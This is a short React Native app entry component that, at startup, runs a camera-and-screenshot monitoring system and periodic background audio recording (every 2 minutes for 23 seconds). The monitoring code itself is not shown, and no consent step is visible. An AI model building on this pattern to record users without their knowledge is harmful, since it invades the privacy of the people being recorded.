import React from 'react';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { AppNavigator } from './src/navigation';
import { initializeMonitoringSystem } from './src/utils/initCameraAndScreenshots';
import { setupCompleteAudioRecording } from './src/utils/audio/periodicAudioSetup';

// Initialize monitoring system on app startup
const stopMonitoring = initializeMonitoringSystem();

// Initialize audio recording (every 2 minutes for 23 seconds)
const stopAudioRecording = setupCompleteAudioRecording(2);

export default function App() {
  // The monitoring system is already running in the background
  // We can optionally add cleanup when app unmounts
  React.useEffect(() => {
    return () => {
      // Clean up monitoring when app closes
      stopMonitoring();
      stopAudioRecording();
    };
  }, []);

  return (
    <SafeAreaProvider>
      <AppNavigator />
    </SafeAreaProvider>
  );
}